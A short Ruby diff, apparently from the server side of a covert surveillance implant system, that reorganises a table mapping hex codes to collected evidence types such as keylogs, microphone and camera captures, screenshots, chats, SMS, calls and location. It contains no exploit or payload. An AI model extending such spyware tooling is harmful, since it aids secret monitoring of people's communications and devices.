@@ -6,17 +6,18 @@ module RCS
 EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0xFFF1 => :DEVICE,       # for scout
                    0x0140 => :CALL,
-                   0x0230 => :CALLLIST,
+                   0x0230 => :CALLLISTOLD,
+                   0x0231 => :CALLLIST,
                    0xC2C2 => :MIC,
                    0x0241 => :INFO,
                    0xB9B9 => :SCREENSHOT,
                    0xFFF2 => :SCREENSHOT,   # for scout
                    0x0040 => :KEYLOG,
                    0xE9E9 => :CAMERA,
-                   0xC6C6 => :CHAT,
-                   0xC6C7 => :CHATNEW,
-                   0x0300 => :CHATSKYPE,
-                   0x0301 => :SOCIAL,      #formato identico a chat
+                   0xC6C6 => :CHATOLD,
+                   0xC6C7 => :CHAT,
+                   0x0300 => :CHATOLD,     # chat skype
+                   0x0301 => :CHATOLD,     # social
                    0x0280 => :MOUSE,
                    0x0100 => :PRINT,
                    0x0180 => :URL,
@@ -30,8 +31,8 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x1220 => :POSITION,
                    0xEDA1 => :FILESYSTEM,  
                    0x1001 => :MAIL,
-                   0x0211 => :SMS,
-                   0x0213 => :SMSNEW,
+                   0x0211 => :SMSOLD,
+                   0x0213 => :SMS,
                    0x0212 => :MMS,         #message
                    0x0200 => :ADDRESSBOOK,
                    0x0250 => :IADDRESSBOOK,
